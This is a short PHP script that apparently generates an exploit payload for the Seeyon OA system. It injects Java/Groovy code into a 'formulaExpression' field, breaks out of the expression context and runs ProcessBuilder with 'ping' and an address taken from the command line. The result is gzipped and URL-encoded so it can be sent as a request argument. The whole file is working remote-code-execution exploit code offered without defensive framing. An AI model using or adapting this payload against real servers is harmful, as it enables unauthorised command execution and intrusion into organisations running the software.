<?php
$aaa=$argv[1];
// echo $aaa;
$arrayNam =array('formulaType' =>1 ,
'formulaName'=>'test',
'formulaExpression'=>'String path = "../webapps/seeyon/";
	ProcessBuilder processBuilder = new ProcessBuilder("ping","xxxxxxxxxxxxxxxxxxxxxxxxxxx");
	Process p = processBuilder.start();
    };test();def static xxx(){',
  );
// print_r($arrayNam);
$arrayNam['formulaExpression']=str_replace("xxxxxxxxxxxxxxxxxxxxxxxxxxx",$aaa,$arrayNam['formulaExpression']);
$a= '';
$b= (Object)array();
$c= 'true';
$e=array($arrayNam,$a,$b,$c);
$json = json_encode($e);
echo urlencode(iconv('latin1', 'utf-8',gzencode($json)));
// 解码代码
// $s='string';//arguments值复制到此
// echo gzdecode(iconv('utf-8', 'latin1', urldecode($s)));
?>